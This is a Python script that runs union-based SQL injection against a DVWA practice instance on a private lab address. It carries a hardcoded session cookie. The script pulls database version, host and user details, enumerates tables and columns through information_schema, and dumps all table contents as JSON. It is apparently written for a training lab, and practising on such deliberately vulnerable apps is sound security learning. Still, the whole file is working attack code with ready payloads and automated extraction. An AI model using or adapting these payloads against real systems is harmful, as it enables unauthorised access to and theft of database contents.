import requests
import json
from urllib.parse import quote as enc

level = "low"
cookies = {'security':level,'PHPSESSID':'8de1f50e303cd52f177bcdbbc192598e'}
counterRequests = 0

def getData(payload):
	global counterRequests
	counterRequests += 1
	data = []
	url = f"http://10.0.2.5/dvwa/vulnerabilities/sqli/?id={enc(payload)}&Submit=Submit#"
	get = requests.get(url, cookies = cookies)
	res = get.text.split("First name: ")[1:]
	for r in res:
		data.append(r.split("<br>Surname:")[0])
	return data

# GET DB INFO
sepChar = '" ? "'
payloadInfo = f"' UNION SELECT CONCAT(@@version, {sepChar}, @@hostname, {sepChar}, database(), {sepChar}, user()), null#"
infoDB = getData(payloadInfo)[0].split(sepChar[1:-1])
# print(f"Database information:\n {infoDB}")

# GET TABLES
payloadTable = "' UNION SELECT table_name, null FROM information_schema.tables WHERE table_rows > 0#"
tables = getData(payloadTable)
# print(f"Tables found:\n {tables}")

# GET COLUMNS
dbData = {}
for t in tables:
	payloadColumn = f"' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name = '{t}'#"
	columns = getData(payloadColumn)
	dbData[t] = {"columns":columns}
# print(f"Table and columns:\n {dbData}")

# GET DATA
for t in dbData:
	concatColumns = "CONCAT("
	for c in dbData[t]["columns"]:
		concatColumns = concatColumns + f"{c}, {sepChar}, "
	concatColumns = concatColumns[:-(len(sepChar)+4)] + ")"
	payloadData = f"' UNION SELECT {concatColumns}, null FROM {t}#"
	data = getData(payloadData)

	tableData = []
	for d in data:
		row = d.split(sepChar[1:-1])
		entry = {}
		for i in range(len(dbData[t]["columns"])):
			entry[dbData[t]["columns"][i]] = row[i]
		tableData.append(entry)
	dbData[t]["data"]=tableData
	
print(json.dumps(dbData))
print(f"[*]Number of sent requests: {counterRequests}")